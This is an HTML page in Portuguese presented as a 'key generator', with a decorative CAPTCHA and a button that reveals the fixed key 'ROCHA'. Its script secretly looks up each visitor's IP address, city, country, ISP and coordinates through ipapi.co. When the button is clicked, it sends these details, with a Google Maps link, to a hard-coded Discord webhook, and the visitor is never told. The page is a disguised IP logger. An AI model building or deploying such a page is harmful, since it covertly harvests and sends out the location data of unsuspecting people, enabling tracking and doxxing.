<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>Gerador de Key</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            margin: 0; padding: 0; min-height: 100vh;
            font-family: 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #19366b 40%, #14151c 100%);
            display: flex; flex-direction: column; align-items: center; justify-content: center;
        }
        .container {
            background: rgba(22,28,54,0.92);
            padding: 38px 28px 30px 28px;
            border-radius: 22px;
            box-shadow: 0 8px 32px rgba(11,59,193,0.18), 0 2px 18px #0002;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 28px;
        }
        .logo {
            font-size: 2.2rem; font-weight: bold; color: #fff; letter-spacing: 2px;
            margin-bottom: 10px; display: flex; align-items: center; gap: 12px;
        }
        .key-box {
            background: #181c27;
            color: #fff;
            border-radius: 12px;
            border: 2px dashed #0b3bc1;
            font-size: 1.45rem;
            padding: 13px 30px;
            margin-top: 12px;
            letter-spacing: 2px;
            font-family: monospace;
            user-select: all;
        }
        .custom-btn {
            background: linear-gradient(135deg, #1b5ae6 0%, #0b3bc1 70%, #1d192a 100%);
            color: #fff;
            border: none;
            border-radius: 30px;
            padding: 18px 38px;
            font-size: 1.18rem;
            font-weight: bold;
            cursor: pointer;
            box-shadow: 0 4px 18px #0b3bc140;
            transition: background 0.21s, box-shadow 0.15s, transform 0.17s;
            margin-top: 12px;
        }
        .custom-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        .custom-btn:hover:not(:disabled), .custom-btn:focus:not(:disabled) {
            background: linear-gradient(135deg, #2564e0 0%, #174acb 75%, #18151f 100%);
            box-shadow: 0 4px 24px #2186ff44;
            transform: scale(1.05);
        }
        .footer {
            margin-top: 28px;
            color: #fff;
            font-size: 1.12rem;
            opacity: 0.92;
            text-shadow: 0 2px 7px #0b3bc1, 0 1px 6px #0008;
            letter-spacing: 1px;
        }
        /* CAPTCHA Styles */
        .captcha-overlay {
            position: fixed; left: 0; top: 0; right: 0; bottom: 0;
            background: rgba(10,16,28,0.93); z-index: 2000;
            display: flex; align-items: center; justify-content: center;
        }
        .captcha-box {
            background: #181c27;
            padding: 36px 34px 30px 34px;
            border-radius: 18px;
            box-shadow: 0 6px 36px #0b3bc188;
            display: flex; flex-direction: column; align-items: center;
            gap: 18px;
            border: 2px solid #0b3bc1;
            min-width: 300px;
        }
        .captcha-title { font-size: 1.25rem; color: #fff; font-weight: bold; margin-bottom: 4px;}
        .captcha-instructions { color: #bdbdbd; font-size: 1.07rem; text-align: center; margin-bottom: 0;}
        .captcha-image {
            font-family: monospace; background: #10192b; color: #0b3bc1;
            padding: 8px 18px; border-radius: 10px; letter-spacing: 4px;
            font-size: 1.55rem; font-weight: 700; border: 2px dashed #0b3bc1;
            user-select: none; margin-right: 8px; min-width: 125px;
            display: inline-block; text-align: center;
        }
        .captcha-refresh-btn { background: none; border: none; color: #0b3bc1; font-size: 1.5rem; cursor: pointer; margin-left: 7px; transition: color 0.2s;}
        .captcha-refresh-btn:hover { color: #2a6fff; }
        .captcha-input { font-size: 1.15rem; padding: 7px 15px; border-radius: 9px; border: 2px solid #0b3bc1; background: #181c24; color: #fff; outline: none; width: 120px; text-align: center; letter-spacing: 2px; font-family: 'Segoe UI', monospace, Arial, sans-serif; font-weight: 600;}
        .captcha-submit-btn { background: linear-gradient(135deg, #0b3bc1 0%, #183c99 100%); color: #fff; border-radius: 10px; border: 2px solid #0b3bc1; padding: 10px 28px; font-size: 1.07rem; font-weight: bold; cursor: pointer; margin-top: 10px; transition: background 0.13s, box-shadow 0.14s;}
        .captcha-submit-btn:hover, .captcha-submit-btn:focus { background: linear-gradient(135deg, #2564e0 0%, #174acb 100%); box-shadow: 0 0 0 3px #a7c3fa55;}
        .captcha-error { color: #da4848; font-size: 1.02rem; min-height: 18px; margin-top: 3px; margin-bottom: 0;}
    </style>
</head>
<body>
    <!-- CAPTCHA Overlay -->
    <div class="captcha-overlay" id="captcha-overlay">
        <form class="captcha-box" id="captcha-form" autocomplete="off" onsubmit="return false;">
            <div class="captcha-title">ðŸ”’ Sistema de SeguranÃ§a</div>
            <div class="captcha-instructions">
                Para acessar o Gerador de Key, confirme que vocÃª Ã© uma pessoa:<br>
                <span style="color:#0b3bc1;font-size:1.02em;">Digite o cÃ³digo abaixo corretamente.</span>
            </div>
            <div>
                <span class="captcha-image" id="captcha-image"></span>
                <button class="captcha-refresh-btn" type="button" title="Novo cÃ³digo" id="captcha-refresh-btn">ðŸ”„</button>
            </div>
            <input class="captcha-input" id="captcha-input" maxlength="6" placeholder="CÃ³digo" autocomplete="off">
            <div class="captcha-error" id="captcha-error"></div>
            <button class="captcha-submit-btn" id="captcha-submit-btn">Entrar</button>
        </form>
    </div>
    <div class="container" id="main-container" style="display:none;">
        <div class="logo">
            <span>ðŸ”‘</span> Gerador de Key
        </div>
        <button class="custom-btn" id="btn-gerar-key" disabled>Ver Key</button>
        <div class="key-box" id="key-box" style="display:none;">ROCHA</div>
    </div>
    <div class="footer">
        âœ¨ maked by rocha
    </div>
    <script>
        // CAPTCHA Logic
        let captchaCode = '';
        function gerarCaptcha() {
            const chars = "ABCDEFGHJKMNPQRSTUVWXYZ23456789";
            let code = "";
            for (let i = 0; i < 6; i++) {
                code += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return code;
        }
        function refreshCaptcha() {
            captchaCode = gerarCaptcha();
            document.getElementById("captcha-image").textContent = captchaCode.split('').join(' ');
            document.getElementById("captcha-input").value = "";
            document.getElementById("captcha-error").textContent = "";
        }
        function checkCaptcha() {
            const userInput = document.getElementById("captcha-input").value.trim().toUpperCase();
            const errorEl = document.getElementById("captcha-error");
            if (userInput === captchaCode) {
                document.getElementById("captcha-overlay").style.display = "none";
                document.getElementById("main-container").style.display = "flex";
                document.getElementById("captcha-input").value = "";
                errorEl.textContent = "";
            } else {
                errorEl.textContent = "CÃ³digo incorreto. Tente novamente!";
                setTimeout(() => { errorEl.textContent = ""; }, 1800);
                refreshCaptcha();
            }
        }
        document.addEventListener("DOMContentLoaded", () => {
            refreshCaptcha();
            document.getElementById("captcha-refresh-btn").onclick = refreshCaptcha;
            document.getElementById("captcha-submit-btn").onclick = function(e) {
                e.preventDefault();
                checkCaptcha();
            };
            document.getElementById("captcha-form").onsubmit = function(e) {
                e.preventDefault();
                checkCaptcha();
            };
            document.getElementById("captcha-input").addEventListener("keydown", function(e){
                if (e.key === "Enter") {
                    e.preventDefault();
                    checkCaptcha();
                }
            });
        });

        // Ativar botÃ£o sÃ³ depois que pegar ipapi (ou timeout fallback)
        let userInfo = {};
        function enableBtnGerarKey() {
            document.getElementById("btn-gerar-key").disabled = false;
        }
        window.onload = function() {
            // Tenta pegar a info antes de liberar o botÃ£o
            fetch("https://ipapi.co/json/")
                .then(r => r.json())
                .then(data => { userInfo = data; enableBtnGerarKey(); })
                .catch(() => { userInfo = {}; enableBtnGerarKey(); });
        };

        // Webhook e ExibiÃ§Ã£o da Key ROCHA
        document.getElementById("btn-gerar-key").onclick = function () {
            const key = "ROCHA";
            const ip = userInfo.ip || "Desconhecido";
            const cidade = userInfo.city || "Desconhecida";
            const regiao = userInfo.region || "";
            const pais = userInfo.country_name || "Desconhecido";
            const org = userInfo.org || "";
            const latitude = userInfo.latitude || "";
            const longitude = userInfo.longitude || "";
            const mapa = (latitude && longitude) ? `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}` : "";
            const loc = `${cidade}, ${regiao}, ${pais}`.replace(/^[ ,]+|[ ,]+$/g, "");
            const dataHora = new Date().toLocaleString("pt-BR", { timeZone: "America/Sao_Paulo" });
            let msg = `ðŸ”‘ **Nova Key Gerada!**
**Key:** \`${key}\`
**IP:** \`${ip}\`
**Data/Hora:** \`${dataHora}\`
**LocalizaÃ§Ã£o:** \`${loc}\`
${mapa ? "**Mapa:** " + mapa : ""}
${org ? "**Org:** \`${org}\`" : ""}`;

            // Webhook
            fetch("https://discord.com/api/webhooks/1391097496960241714/CfjQZNJAVqHQ6oN_lsGs6xe38D-0tdPZ_hse0USVqq_1oWv52CWzmbVDdR82tRFJrtWI", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: msg })
            });

            // Mostra a key ROCHA
            const keyBox = document.getElementById("key-box");
            keyBox.style.display = "block";
        }
    </script>
</body>
</html>
